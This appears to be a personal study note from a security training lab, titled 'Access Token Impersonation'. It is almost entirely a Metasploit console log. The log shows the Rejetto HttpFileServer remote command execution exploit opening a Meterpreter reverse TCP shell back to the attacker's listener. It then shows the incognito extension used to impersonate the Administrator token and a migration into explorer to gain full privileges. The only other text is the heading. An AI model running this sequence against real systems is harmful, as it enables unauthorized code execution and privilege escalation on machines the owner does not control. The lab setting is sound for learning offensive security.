# Access Token Impersonation

```sh
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.5.29.158
rhosts => 10.5.29.158
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/DcGM7L1gnt7N
[*] Local IP: http://10.10.12.2:8080/DcGM7L1gnt7N
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /DcGM7L1gnt7N
[*] Sending stage (175174 bytes) to 10.5.29.158
[!] Tried to delete %TEMP%\GTkOzmXtxEM.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.29.158:49760) at 2024-01-01 20:48:39 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > pgrep explorer
3260
meterpreter > migrate 3260
[*] Migrating from 1108 to 3260...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > load incognito
Loading extension incognito...
[*] 10.5.29.158 - Meterpreter session 1 closed.  Reason: Died

[-] Failed to load extension: No response was received to the core_loadlib request.
msf6 exploit(windows/http/rejetto_hfs_exec) > 
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/TPmENds0h894IU
[*] Local IP: http://10.10.12.2:8080/TPmENds0h894IU
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /TPmENds0h894IU
[*] Sending stage (175174 bytes) to 10.5.29.158
[!] Tried to delete %TEMP%\sbTeYyvIIvphsy.vbs, unknown result
[*] Meterpreter session 2 opened (10.10.12.2:4444 -> 10.5.29.158:49773) at 2024-01-01 20:53:02 +0530
[*] Server stopped.

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > 

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > pgrep explorer
3260
meterpreter > migrate 3260
[*] Migrating from 4356 to 3260...
[*] Migration completed successfully.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 


```
